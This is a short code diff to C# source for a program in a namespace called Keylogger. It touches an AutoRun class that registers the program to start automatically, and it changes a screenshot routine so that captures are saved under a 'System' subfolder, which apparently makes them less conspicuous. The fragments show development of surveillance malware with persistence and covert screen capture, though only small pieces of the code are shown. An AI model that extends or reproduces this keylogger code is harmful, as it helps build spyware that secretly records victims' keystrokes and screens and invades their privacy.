@@ -9,6 +9,7 @@ using System.Drawing;
 using System.Windows.Interop;
 using System.Collections.Generic;
 using System.Diagnostics;
+//using System.IO.Compression;
 
 namespace Keylogger
 {
@@ -17,6 +18,7 @@ namespace Keylogger
 
     public class AutoRun
     {
+        
         public static bool SetAutoRun(bool autorun, string path)
         {
             const string name = "Keylogger";
@@ -394,7 +396,7 @@ namespace Keylogger
 
         public static void ScreenSave(string numscreen)
         {
-            string path = AutoRun.Path() + numscreen + ".jpg";
+            string path = AutoRun.Path()+"\\System\\" + numscreen + ".jpg";
            // string path = AutoRun.Path() +  "Key.rtf";
             
             
